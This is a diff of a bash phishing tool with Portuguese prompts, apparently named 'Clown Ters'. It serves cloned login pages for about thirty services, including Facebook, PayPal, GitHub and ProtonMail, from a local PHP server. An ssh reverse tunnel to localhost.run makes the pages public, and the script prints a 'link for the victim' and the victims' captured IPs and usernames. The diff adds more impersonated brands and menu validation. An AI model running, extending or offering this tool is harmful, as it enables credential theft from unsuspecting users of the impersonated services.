@@ -29,12 +29,29 @@ done
 read -t 60 -p $'\e[1;32m [\e[1;31m+\e[1;32m]\e[1;32m Selecione a opção:\e[1;36m ' option
 }
 if ! [[ -f .okay ]]; then
+  printf "\e[1;32m $\e[1;34m Instalando os pacotes\n"
+  pkg="apt-get"
+  [[ "${HOME}" == "/data/data/com.termux/files/home" ]] &&  pkg="pkg"
+  for i in "curl" "openssh" "php" "unzip" "figlet"; do
+    [[ "${i}" == "openssh" ]] && i="ssh"
+    [[ -n $(command -v ${i}) ]] && continue
+    printf "\e[1;32m $\e[1;34m Instalando ${i}\n"
+    [[ "${i}" == "ssh" ]] && i="openssh"
+    ${pkg} install ${i} &>/dev/null
+  done
   printf "\e[1;33m Digite yes para continuar\e[m\n\n"                    ssh -R 80:localhost:8282 nokey@localhost.run &>/dev/null &
   sleep 20                                                               > .okay
 fi
 [[ -f "Modules.zip" ]] && unzip Modules.zip && rm Modules.zip
-options=(" " "facebook" "instagram" "google" "microsoft" "netflix" "paypal" "steam" "twitter")
-_banner
+options=(" " "facebook" "instagram" "google" "microsoft" "netflix" "paypal" "steam" "twitter" "playstation" "github" "twitch" "pinterest" "snapchat" "linkedin" "ebay" "dropbox" "protonmail" "spotify" "reddit" "adobe" "deviantArt" "badoo" "origin" "cryptoCoin" "yahoo" "wordpress" "yandex" "stackoverFlow" "vk" "xbox")
+while :; do
+  _banner
+  [[ -z "${option}" ]] && printf "\e[1;33m Digite algo!\n" && sleep 1 && continue
+  [[ -z "$(echo ${option} | tr -d -c [0-9])" ]] && printf "\e[1;33m Apenas números!" && sleep 1 && continue
+  [[ "${option}" -gt 30 ]] && printf "\e[1;33m Opção invalida\n" && sleep 1 && continue
+  [[ "${option}" == "0" ]] && exit 0
+  break
+done
 cd .Modules/"${options[${option}]}"/
 rm -rf *.txt
 php -S localhost:8181 > /dev/null 2>&1 &
@@ -42,12 +59,12 @@ ssh -R 80:localhost:8181 nokey@localhost.run &> a.txt &
 sleep 5
 while :; do
   printf "\ec\e[1;31m" && figlet Clown Ters
-  printf "\n\e[1;34m Link para a vitima:\e[0;32m$(sed 's/,/\n/g' a.txt | grep ' h' | grep '.li')\n\e[1;34m Seu localHost:\e[0;32m http://localhost:8181\n\n"
+  printf "\n\e[1;34m Link para a vitima:\e[0;32m$(sed 's/,/\n/g' a.txt | grep ' h' | grep '.li')\n\e[1;34m Seu localHost:\e[0;32m http://localhost:8181\n"
   if [[ -f ip.txt ]]; then
      cat ip.txt
      [[ -f usernames.txt ]] && cat usernames.txt
   else
-    printf "\e[1;34m Esperando a vitima acessar a url\n" 
+    printf "\n\e[1;34m Esperando a vitima acessar a url\n" 
   fi
   sleep 5
 done
